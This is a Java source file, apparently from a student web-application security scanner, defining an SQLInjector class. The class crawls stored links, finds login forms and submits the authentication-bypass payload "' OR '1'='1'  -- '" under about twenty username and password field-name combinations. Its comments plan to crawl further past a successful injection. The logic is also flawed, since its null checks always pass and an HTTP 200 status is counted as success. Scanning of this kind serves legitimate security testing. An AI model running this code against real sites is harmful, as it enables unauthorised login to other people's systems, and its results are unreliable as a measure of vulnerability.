/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.daiict.mscit.pl1.wasc.security;

import java.util.HashMap;
import java.util.Map;
import org.daiict.mscit.pl1.wasc.entities.*;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.helper.HttpConnection;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.jsoup.nodes.Element;

/**
 *
 * @author VJ
 */
public class SQLInjector {
    
    //how wud you pass the links to the sqlinjector to start doing its procedure?
    //central link store???
    //method that checks whether the link has a form or not.
    //a function to check what kind of form it is, i.e. login form or register kind of.
    //if yes then a nother method will do (various) sql injection(/s) on it.
    //if success then it will further crawl to new discovered pages behing the sql injected response page
    //follow the same procedure
    
    //public static boolean 
    
    private LinkStore linkStore=null;
    private Map<Integer,Boolean> Report=null;
    
    public SQLInjector(LinkStore linkstore){
        this.linkStore=linkstore;
        this.Report=new HashMap<Integer, Boolean>();
    }
    
    public boolean test(){
        boolean result=false;
        
        for(Link l: linkStore.getStore().values()){
            result=test(l);
        }
        return result;
    }
    
    public boolean test(Link link){
        
        try{
            
            Document doc = Jsoup.connect(link.getURL()).get();            
            Elements forms = doc.select("form[action]");
            if(forms.isEmpty())
                return false;
            
            Element form=forms.first();
            Elements textboxes=null;
            Elements hidden=form.select("input[type=hidden]");
            String submitURL=form.attr("abs:action");
            
            if(form.getElementsByAttributeValue("type", "password")!=null){  //it means the form is a login form.. ;)
                textboxes=form.getElementsByAttributeValue("type", "text");
                
                Connection con=Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);
                //20 combinations of username password..
                //<editor-fold>
                if((form.getElementsByAttributeValue("name", "username")!=null)&&(form.getElementsByAttributeValue("name", "password")!=null)){
                    con=con.data("username","' OR '1'='1'  -- '","password","");
                }
                if((form.getElementsByAttributeValue("name", "username")!=null)&&(form.getElementsByAttributeValue("name", "passwd")!=null)){
                    con=con.data("username","' OR '1'='1'  -- '","passwd","");
                }
                if((form.getElementsByAttributeValue("name", "username")!=null)&&(form.getElementsByAttributeValue("name", "pass")!=null)){
                    con=con.data("username","' OR '1'='1'  -- '","pass","");
                }
                if((form.getElementsByAttributeValue("name", "username")!=null)&&(form.getElementsByAttributeValue("name", "pwd")!=null)){
                    con=con.data("username","' OR '1'='1'  -- '","pwd","");
                }
                if((form.getElementsByAttributeValue("name", "usernm")!=null)&&(form.getElementsByAttributeValue("name", "password")!=null)){
                    con=con.data("usernm","' OR '1'='1'  -- '","password","");
                }
                if((form.getElementsByAttributeValue("name", "usernm")!=null)&&(form.getElementsByAttributeValue("name", "passwd")!=null)){
                    con=con.data("usernm","' OR '1'='1'  -- '","passwd","");
                }
                if((form.getElementsByAttributeValue("name", "usernm")!=null)&&(form.getElementsByAttributeValue("name", "pass")!=null)){
                    con=con.data("usernm","' OR '1'='1'  -- '","pass","");
                }
                if((form.getElementsByAttributeValue("name", "usernm")!=null)&&(form.getElementsByAttributeValue("name", "pwd")!=null)){
                    con=con.data("usernm","' OR '1'='1'  -- '","pwd","");
                }
                if((form.getElementsByAttributeValue("name", "uname")!=null)&&(form.getElementsByAttributeValue("name", "password")!=null)){
                    con=con.data("uname","' OR '1'='1'  -- '","password","");
                }
                if((form.getElementsByAttributeValue("name", "uname")!=null)&&(form.getElementsByAttributeValue("name", "passwd")!=null)){
                    con=con.data("uname","' OR '1'='1'  -- '","passwd","");
                }
                if((form.getElementsByAttributeValue("name", "uname")!=null)&&(form.getElementsByAttributeValue("name", "pass")!=null)){
                    con=con.data("uname","' OR '1'='1'  -- '","pass","");
                }
                if((form.getElementsByAttributeValue("name", "uname")!=null)&&(form.getElementsByAttributeValue("name", "pwd")!=null)){
                    con=con.data("uname","' OR '1'='1'  -- '","pwd","");
                }
                if((form.getElementsByAttributeValue("name", "user")!=null)&&(form.getElementsByAttributeValue("name", "password")!=null)){
                    con=con.data("user","' OR '1'='1'  -- '","password","");
                }
                if((form.getElementsByAttributeValue("name", "user")!=null)&&(form.getElementsByAttributeValue("name", "passwd")!=null)){
                    con=con.data("user","' OR '1'='1'  -- '","passwd","");
                }
                if((form.getElementsByAttributeValue("name", "user")!=null)&&(form.getElementsByAttributeValue("name", "pass")!=null)){
                    con=con.data("user","' OR '1'='1'  -- '","pass","");
                }
                if((form.getElementsByAttributeValue("name", "user")!=null)&&(form.getElementsByAttributeValue("name", "pwd")!=null)){
                    con=con.data("user","' OR '1'='1'  -- '","pwd","");
                }
                if((form.getElementsByAttributeValue("name", "unm")!=null)&&(form.getElementsByAttributeValue("name", "password")!=null)){
                    con=con.data("unm","' OR '1'='1'  -- '","password","");
                }
                if((form.getElementsByAttributeValue("name", "unm")!=null)&&(form.getElementsByAttributeValue("name", "passwd")!=null)){
                    con=con.data("unm","' OR '1'='1'  -- '","passwd","");
                }
                if((form.getElementsByAttributeValue("name", "unm")!=null)&&(form.getElementsByAttributeValue("name", "pass")!=null)){
                    con=con.data("unm","' OR '1'='1'  -- '","pass","");
                }
                if((form.getElementsByAttributeValue("name", "unm")!=null)&&(form.getElementsByAttributeValue("name", "pwd")!=null)){
                    con=con.data("unm","' OR '1'='1'  -- '","pwd","");
                }
                //</editor-fold>
                
                //dropping the idea of regex username password and sticking to 20 combinations we thought of; for the time being.
                //String Uregex="[t[e]xt][u][s][e][r]n[a]m[e]{3,12}";
                //String Pregex="[t[e]xt]p[a][s][s][w][o][r][d]{3,12}";
                
                for(Element e : hidden){
                    con.data(e.attr("name"),e.attr("value"));
                }
                
                HttpConnection.Response res=(HttpConnection.Response)con.execute();
            
            int statusCode=res.statusCode();
            Document responseDoc=res.parse();
            System.out.println("Status Code : " + statusCode);
            //System.out.println(responseDoc.toString());
            
            return (statusCode==200?true:false); 
            }
            
        }catch(Exception ex){
            ex.printStackTrace();
        }
        
        return false;
    } 
}
